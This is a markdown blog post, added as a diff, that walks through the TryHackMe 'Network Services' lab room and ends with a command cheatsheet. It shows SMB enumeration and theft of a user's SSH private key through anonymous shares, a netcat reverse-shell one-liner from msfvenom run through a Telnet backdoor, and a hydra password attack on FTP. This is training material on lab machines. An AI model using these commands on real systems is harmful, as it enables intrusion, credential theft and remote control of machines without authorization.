@@ -1,0 +1,526 @@
+---
+title: "Network Services"
+author: "hacker_newb"
+date: "2023-07-27"
+categories: [TryHackMe, Network]
+image: "network-service.png"
+---
+
+Network Services. Explore a few common Network Service vulnerabilities and misconfigurations that you're likely to find in CTFs, and some penetration test scenarios.
+
+<img width='800' src='boxes.png'>
+
+
+
+## <span style="color:#ffcc66"> Task 2 </span>
+
+SMB is _Server Message Block_ protocol, which is a client-server communication used for sharing access to files, printers, serial ports and other resources on a network.
+
+Servers make file systems and other resources (printers, named pipes, APIs) available to clients on the network. Client computers may have their own hard disks, but they also want access to the shared file systems and printers on the servers.
+
+- The SMB protocol is known as a response-request protocol (many messages sent to establish a connection via TCP/IP)
+
+Once they have established a connection, clients can then send commands (SMBs) to the server that allow them to access to open files, read and write files, and generally do all the sort of things that you want to do with a file system but inside a network.
+
+- runs on Windows (since Windows 95)
+- Samba open source version
+
+
+Question: _What does SMB stand for?_
+
+- server message block
+
+Question: _What type of protocol is SMB?_
+
+- response-request
+
+Question: _What do clients connect to servers using?_
+
+- TCP/IP
+
+Question: _What systems does Samba run on?_
+
+- unix
+
+
+
+
+
+## <span style="color:#ffcc66"> Task 3  </span>
+
+Enumeration is the process of gathering information on a target in order to find potential attack vectors and aid in exploitation.
+
+- This process is essential for an attack to be successful, as wasting time with exploits that either don't work or can crash the system can be a waste of energy. 
+
+Enumeration can be used to gather usernames, passwords, network information, hostnames, application data, services, or any other information that may be valuable to an attacker.
+
+- there are SMB share drives on a server that can be connected to and used to view or transfer files. 
+- SMB can often be a great starting point for an attacker looking to discover sensitive information
+
+
+Port scanning is step 1 for enumeration, find out as much info as you can about the services, apps, structure and operating system of target machine. 
+
+- Enum4linux is a tool used to enumerate SMB shares on both Windows and Linux systems.
+-  a wrapper around the tools in the Samba package and makes it easy to quickly extract information from the target pertaining to SMB
+-  installed in Parrot OS and Kali
+
+| Tag   | Function          |
+|-------|-------------------|
+| `-U`  | get userlist      |
+| `-M`  | get machine list  |
+| `-N`  | namelist dump     |
+| `-S`  | get sharelist     |
+| `-P`  | get password info |
+| `-G`  | get group, members|
+| `-a`  | _all of the above_|
+
+- syntax: `enum4linux [OPTIONS] IP_ADDRESS`
+
+
+
+Question: _Conduct an nmap scan of your choosing, How many ports are open?_
+
+- `nmap -sS -sV IP_address`
+- 3, SSH and Samba (2)
+
+Question: _What ports is SMB running on?_
+
+- 139/445
+
+Question: _Let's get started with Enum4Linux, conduct a full basic enumeration. For starters,what is the workgroup name?_
+
+- WORKGROUP
+
+Question: _What comes up as the name of the machine?_ 
+
+- hint: look under OS info
+- POLOSMB
+
+Question: _What operating system version is running?_
+
+- 6.1
+
+Question: _What share sticks out as something we might want to investigate?_
+
+- profiles
+
+
+
+
+## <span style="color:#ffcc66"> Task 4 </span>
+
+SMB Exploits. 
+
+- example:  CVE-2017-7494 that can allow remote code execution by exploiting SMB
+- likely to encounter a situation where the best way into a system is due to misconfigurations in the system
+
+We're going to be exploiting anonymous SMB share access - _a common misconfiguration that can allow us to gain information that will lead to a shell_.
+We know from the scan where the SMB share location and the name of interesting SMB share.
+
+We need a client to access resources on servers, using SMBClient because it's part of the default samba suite (installed in Parrot OS & Kali). 
+
+- syntax: `smbclient // [IP]/[SHARE]  [TAG]`
+- `-U [name]` to specify user
+- `-p [host]` specify port 
+
+Question: _What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?_
+ 
+- `smbclient //IP_address/secret -U suit -p 445`
+
+
+
+Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn't require authentication to view the files. We can do this easily by:
+
+- using username: Anonymous and not supplying a password
+
+The share we are interested in is `profiles`, so need to run: 
+
+- `smbclient //IP_address/profiles` and just hit enter for password
+
+
+Question: _Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?_
+
+- my first command was `help` as I am not familiar with this system and found that you can use `l` to list files. You see a file "Working from home info.txt". The `cat` command does not work, but you can use `? get` to see what this command does, and turns out that is the command we need.
+- type: `get "Working From Home Information.txt"` 
+- open a new tab in the terminal, `ls` and see the text file
+- `cat 'Workin<tab>'`
+- john cactus
+
+Question: _What service has been configured to allow him to work from home?_
+
+- ssh
+
+Question: _Okay! Now we know this, what directory on the share should we look in?_
+
+- .ssh
+
+Question: _This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?_
+
+- when we `l` we see 'DH' assigned to the '.ssh' file, so `cd .ssh`, then `l`
+- hint: What is the default name of an SSH identity file?
+- `id_rsa`
+
+Download the file using the `get` command. Then `chmod 600 id_rsa`.
+
+
+Question: _Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server. What is the smb.txt flag?_
+
+- The information we know: john cactus, workinggroup, profiles, ssh service.
+- `man ssh` , to remote login to service and point to a file `-i`
+- `ssh -i id_rsa cactus@IP_address`
+- `pwd` > `ls` > `cat smb.txt`
+- type 'exit' to quit
+
+
+
+
+
+## <span style="color:#ffcc66"> Task 5  </span>
+
+Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.
+
+The telnet client will establish a connection with the server. The client will then become a virtual terminal- allowing you to interact with the remote host.
+
+- Telnet sends all messages in clear text and has no specific security mechanisms.
+- SSH has replaced many Telnet apps
+
+How it works:
+
+1. user connect to the Telnet server protocol `telnet` prompt
+2. user executes command on server
+
+- syntax: `telnet [IP] [PORT]`
+
+
+Question: _What is Telnet?_
+
+- application protocol
+
+Question: _What has slowly replaced Telnet?_
+
+- ssh
+
+Question: _How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?_
+
+- `telnet 10.10.10.3 23`
+
+Question: _The lack of what, means that all Telnet communication is in plaintext?_
+
+- encryption
+
+
+
+
+
+## <span style="color:#ffcc66"> Task 6 </span>
+
+
+Telnet enumeration, vulnerabilities that could be potentially trivial to exploit don't always jump out at us. For that reason, especially when it comes to enumerating network services, we need to be thorough in our method. 
+
+Port scanning is always step 1. 
+Telnet runs on port 23. 
+
+Question: _How many ports are open on the target machine?_
+
+- `nmap IP_address -p 23` says port is closed
+- now check for ports `nmap IP_address -p 0-5000` and `nmap IP_address -p 5000-10000`
+- 1
+
+
+Question: _What port is this?_
+
+- 8012
+
+Question: _This port is unassigned, but still lists the protocol it's using, what protocol is this?_
+
+- TCP
+
+
+Question: _Now re-run the nmap scan, without the -p- tag, how many ports show up as open?_
+
+- 0
+
+It's important to try every angle when enumerating, as the information you gather here will inform your exploitation stage.
+
+
+Question: _Based on the title returned to us, what do we think this port could be used for?_
+
+- we found the port that's open, so we now connect to telnet `telnet IP_address 8012`
+- a backdoor
+
+
+Question: _Who could it belong to? Gathering possible usernames is an important step in enumeration._
+
+- skidy
+
+
+
+## <span style="color:#ffcc66"> Task 7  </span>
+
+
+Telnet exploits, as it lacks encryption and poor access control.
+Check for exploits for Telnet client and sever systems.
+
+A CVE, short for Common Vulnerabilities and Exposures, is a list of publicly disclosed computer security flaws. When someone refers to a CVE, they usually mean the CVE ID number assigned to a security flaw.
+
+- https://www.cvedetails.com/
+- https://cve.mitre.org/
+
+
+**Reverse shel**l is a piece of code or program which can be used to gain code or command execution on a device. 
+
+- Attacker IP: 10.10.10.1 , Listening port 4444
+- Target IP: 10.10.10.30 
+- Attacker IP:port <------- Target IP
+
+
+What we know: telnet service, port 8012, a backdoor, 'skidy' name. 
+
+
+- connect to telnet `telnet IP_address 8012`
+- skidy's backdoor.
+- no commands execute
+
+We are using the AttackBox so for the tcpdump: 
+
+- in the terminal open a new tab, paste `sudo tcpdump ip proto \\ icmp -i ens5` type as is
+- back to telnet tab: `.RUN ping [AttackBox IP] -c 1`
+- in other terminal tab you see the pings, takes a few seconds
+  
+
+Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun!
+
+Reverse shell payload suing msfvenom, which egenrates and encodes a netcat reverse shell
+
+- in a new tab type the command, in the attackbox the 'i' button tells you which IP to use for reverse shell
+- command: `msfvenom -p cmd/unix/reverse_netcat lhost=[local IP] lport=4444 R`
+- `-p` payload
+- `lhost` = local host IP (your machine IP)
+- `lport` = local port to listen on (port on your machine)
+- `R` = export payload in raw format
+
+
+
+Question: _What word does the generated payload start with?_
+
+- mkfifo
+
+
+Now in same tab as the msfvenom, type `nc -lvp [listening port]`, it will start listening
+
+Question: _What would the command look like for the listening port we selected in our payload?_
+
+- `nc -lvp 4444`
+
+Now we copy & paste the msfvenom payload into the telnet session and run it as a command.
+
+- in a new tab run `nc -lvp 4444`, this starts listening
+- copy and paste the msfvenom output (starts with mkfifo) into the telnet tab. Make sure you can hit enter for it to execute (tricky) `.RUN mkfifo /tmp/zxbtdxa; nc 10.10.177.6 4444 0</tmp/zxbtdxa | /bin/sh >/tmp/zxbtdxa 2>&1; rm /tmp/zxbtdxa`
+- look at the tab with the `nc -lvp 4444` running, type `ls`
+
+
+Question: _Success! What is the contents of flag.txt?_
+
+- `cat flag.txt` to get the answer
+
+
+
+
+
+
+
+
+
+
+## <span style="color:#ffcc66"> Task 8  </span>
+
+File Transfer Protocol (FTP) is a protocol used to allow remote transfer of files over a network. It uses a client-server protocol model. The client initiates the connection with the server, server validates login credentials and opens the session.
+
+A FTP session has 2 channels:
+
+- a command (control) channel while session is open
+- a data channel 
+
+Connection types:
+
+- active FTP connection, client opens a port and listens (server does the connecting)
+- passive FTP connection, server opens port and listens (client connects)
+
+
+Question: _What communications model does FTP use?_
+
+- client-server
+
+Question: _What's the standard FTP port?_
+
+- 21
+
+Question: _How many modes of FTP connection are there?_
+
+- 2
+
+
+
+
+## <span style="color:#ffcc66"> Task 9 </span>
+
+
+We're going to be exploiting an anonymous FTP login, to see what files we can access- and if they contain any information that might allow us to pop a shell on the system.
+
+- common pathway in CTF challenges
+- mimics a real-life careless implementation of FTP servers
+
+Start off by seeing if FTP is on system, in terminal type `ftp`.
+The `help` shows the commands such as `quit`.
+
+- `cwd` can be run in legacy FTP before authentication which is a bug
+
+Now run a nmap scan.
+
+
+
+Question: _How many ports are open on the target machine?_
+
+- 2
+
+Question: _What port is ftp running on?_
+
+- 21
+
+Question: _What variant of FTP is running on it?_
+
+- to answer this we need to run nmap again `nmap IP -sV`
+- vsftpd
+
+
+We know the type of FTP server, check if able to sign in anonymously to FTP server.
+
+- FTP syntax `ftp IP` 
+- enter anonymous and no password
+
+
+Question: _What is the name of the file in the anonymous FTP directory?_
+
+- PUBLIC_NOTICE.txt
+
+Question: _What do we think a possible username could be?_
+
+- in the tab with the ftp, `get PUBLIC_NOTICE.txt`
+- new tab `ls` and then `cat *.txt`
+- mike
+
+
+
+
+## <span style="color:#ffcc66"> Task 10  </span>
+
+
+FTP exploits due to no encryption to data and can be intercepted.
+
+- Man-in-the-middle attack which can read sensitive data
+
+Information we have: mike, ftp, vsftpd, anonymous login.
+Let's try to bruteforce the password using hydra.
+
+Hydra is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more. Hydra comes by default on both Parrot and Kali.
+
+- Hydra syntax: `hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV IP_address ftp`
+- 
+
+
+Question: _What is the password for the user "mike"?_
+
+- password
+
+Now, let's connect to the FTP server as this user using "ftp [IP]" and entering the credentials when prompted.
+
+- `ftp IP_address` 
+- mike:password
+
+Question: _What is ftp.txt?_
+
+- `ls` > `get ftp.txt`
+- in other tab `cat ftp.txt` and see the flag
+
+
+---
+
+## 
+
+## 
+
+
+# <span style="color:#ff6699"> Cheatsheet </span>
+
+
+### Methodology
+
+1. `nmap -sS -sV IP_address `
+2. `enum4linux -a IP_address`
+3. `smbclient //IP_address/share_name`
+4. `ls` > `get "file-name.txt"` > `cat 'file.txt '`
+5. `cd` `.ssh `> `ls` > `chmod 600 id_rsa` > `ls -la id_rsa`
+6. `ssh -i id_rsa cactus@IP_address`
+7. `pwd` > `ls` > `cat smb.txt`
+
+
+### Task 6, 7
+
+1. `nmap IP_address -p 23`
+2. `nmap IP_address -p (ranges)`
+3. `telnet IP_address 8012`
+4. new terminal tab `sudo tcpdump ip proto \\ icmp -i ens5`
+5. telnet tab `.RUN ping [local IP] -c 1`
+6. in a new tab `msfvenom -p cmd/unix/reverse_netcat lhost=[local IP] lport=4444 R`
+7. same tab `nc -lvp 4444`
+8. telnet tab `.RUN mkfifo /tmp/ujwrd; nc 10.10.74.144 4444 0</tmp/ujwrd | /bin/sh >/tmp/ujwrd 2>&1; rm /tmp/ujwrd`
+
+
+
+### Task 9 
+
+1. `nmap IP_address -p 21 -sV `
+2. `ftp IP`  > anonymous (no password)
+3. `ls` > `get PUBLIC_NOTICE.txt` > other tab `cat *.txt`
+
+
+### Task 10
+
+1. `hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV IP_address ftp`
+2. got password= password
+3. `ftp IP_address` > mike:password
+4. `ls` > `get ftp.txt` > new tab `cat ftp.txt`
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+## Reference 
+
+- [Wiki - Server Message Block](https://en.wikipedia.org/wiki/Server_Message_Block)
+- [TryHackMe Walkthrough](https://www.aldeid.com/wiki/TryHackMe-Network-Services/SMB)
+- [Wiki -Telnet](https://en.wikipedia.org/wiki/Telnet)
+- [FTP cwd bug](https://www.exploit-db.com/exploits/20745)
+- [Medium - Network Services walkthrough](https://medium.com/dont-code-me-on-that/tryhackme-network-services-room-writeup-e00f88b7b599)
